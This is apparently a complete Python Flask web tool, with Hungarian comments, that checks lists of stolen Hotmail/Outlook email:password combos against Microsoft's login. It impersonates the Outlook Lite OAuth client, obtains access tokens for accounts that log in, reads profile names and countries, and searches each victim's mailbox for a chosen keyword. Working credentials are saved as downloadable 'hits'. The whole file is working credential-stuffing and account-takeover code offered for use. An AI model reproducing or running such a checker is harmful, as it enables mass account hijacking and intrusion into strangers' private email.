import os
import uuid
import json
import re
import threading
import time
import requests
from flask import Flask, render_template, request, send_file
from flask_socketio import SocketIO
from user_agent import generate_user_agent

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", ping_timeout=120)

RESULTS_DIR = "results"
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

class HotmailFinalWorker:
    def __init__(self, combo_list, keyword, sid):
        self.combo_list = combo_list
        self.keyword = keyword
        self.sid = sid
        self.hits_file = os.path.join(RESULTS_DIR, f"hits_{sid}.txt")
        self.custom_file = os.path.join(RESULTS_DIR, f"custom_{sid}.txt")
        self.stats = {"hits": 0, "bad": 0, "custom": 0, "retries": 0}

    def log(self, msg, mtype="info"):
        socketio.emit('new_log', {'msg': msg, 'type': mtype}, room=self.sid)

    def update_ui(self):
        socketio.emit('stats_update', self.stats, room=self.sid)

    def run(self):
        self.log(">>> Rendszer: Ellenőrzés indítása a testv2 logikával...", "info")
        
        for line in self.combo_list:
            line = line.strip()
            if not line or '@' not in line or ':' not in line: continue
            
            email, password = line.split(':', 1)
            retries = 0
            success = False
            
            while retries < 3:
                session = requests.Session()
                try:
                    ua = generate_user_agent()
                    # 1. Authorize URL - Pontos paraméterekkel
                    url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    
                    headers = {
                        "User-Agent": ua,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "X-Requested-With": "com.microsoft.outlooklite",
                        "client-request-id": str(uuid.uuid4())
                    }
                    
                    self.log(f"[{email}] Kapcsolódás...", "info")
                    res = session.get(url, headers=headers, timeout=30)
                    
                    # PPFT & urlPost kinyerése
                    ppft = ""
                    url_post = ""
                    sd_match = re.search(r'var ServerData = ({.*?});', res.text, re.DOTALL)
                    if sd_match:
                        sd = json.loads(sd_match.group(1))
                        sFTTag = sd.get('sFTTag', '')
                        if sFTTag:
                            ppft = re.search(r'value="([^"]+)"', sFTTag).group(1)
                        url_post = sd.get('urlPost', '')

                    if not ppft or not url_post:
                        # Fallback regex ha a ServerData nem jönne be
                        ppft = re.search(r'name="PPFT" value="([^"]+)"', res.text).group(1)
                        url_post = re.search(r'"urlPost":"([^"]+)"', res.text).group(1)

                    # 2. Login POST
                    data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=Passport&NewUser=1&i19=3772"
                    login_res = session.post(url_post, data=data, headers={"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded", "Referer": res.url}, allow_redirects=False, timeout=30)

                    if "__Host-MSAAUTHP" not in session.cookies:
                        self.log(f"[BAD] {email}", "bad")
                        self.stats["bad"] += 1
                        success = True; break

                    # 3. Token lekérés
                    auth_code = ""
                    loc = login_res.headers.get('Location', '')
                    if 'code=' in loc: auth_code = loc.split('code=')[1].split('&')[0]
                    
                    if auth_code:
                        t_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                        t_data = {"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "grant_type": "authorization_code", "code": auth_code, "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
                        tr = requests.post(t_url, data=t_data, timeout=30).json()
                        token = tr.get("access_token")
                        cid = session.cookies.get('MSPCID', '').upper()

                        if token and cid:
                            # 4. Profil adatok (Név, Ország)
                            p_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
                            p_headers = {"Authorization": f"Bearer {token}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0"}
                            p_data = requests.get(p_url, headers=p_headers, timeout=30).json()
                            
                            name = p_data.get('names', [{}])[0].get('displayName', 'N/A')
                            country = p_data.get('accounts', [{}])[0].get('location', 'N/A')

                            # 5. Részletes Keresés (testv2 payload)
                            s_url = "https://outlook.live.com/search/api/v2/query"
                            s_payload = {
                                "EntityRequests": [{
                                    "EntityType": "Conversation",
                                    "ContentSources": ["Exchange"],
                                    "Query": {"QueryString": self.keyword},
                                    "Size": 25
                                }]
                            }
                            s_headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0"}
                            s_res = requests.post(s_url, json=s_payload, headers=s_headers, timeout=30).json()
                            
                            try:
                                total = s_res['EntityRequests'][0]['Result']['Total']
                            except: total = 0

                            if int(total) > 0:
                                self.stats["hits"] += 1
                                result = f"{email}:{password} | Name: {name} | Country: {country} | Mails: {total}"
                                with open(self.hits_file, "a") as f: f.write(result + "\n")
                                self.log(f"[HIT] {email} | Név: {name} | Levelek: {total}", "hit")
                            else:
                                self.stats["custom"] += 1
                                with open(self.custom_file, "a") as f: f.write(f"{email}:{password} | Name: {name}\n")
                                self.log(f"[OK] {email} | Név: {name} | Nincs találat", "custom")
                        
                        success = True; break
                except Exception as e:
                    retries += 1
                    self.stats["retries"] += 1
                    self.log(f"Hiba {email} - Újrapróbálás...", "bad")
                    time.sleep(1)
            
            if not success: self.stats["bad"] += 1
            self.update_ui()
            
        self.log(">>> KÉSZ!", "info")
        socketio.emit('finished', {}, room=self.sid)

@app.route('/')
def index(): return render_template('index.html')

@app.route('/download/<ftype>/<sid>')
def download(ftype, sid):
    file = os.path.join(RESULTS_DIR, f"{ftype}_{sid}.txt")
    return send_file(file, as_attachment=True) if os.path.exists(file) else ("Nincs fájl", 404)

@socketio.on('start_check')
def handle_start(data):
    worker = HotmailFinalWorker(data['combo'].splitlines(), data['keyword'], request.sid)
    threading.Thread(target=worker.run).start()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
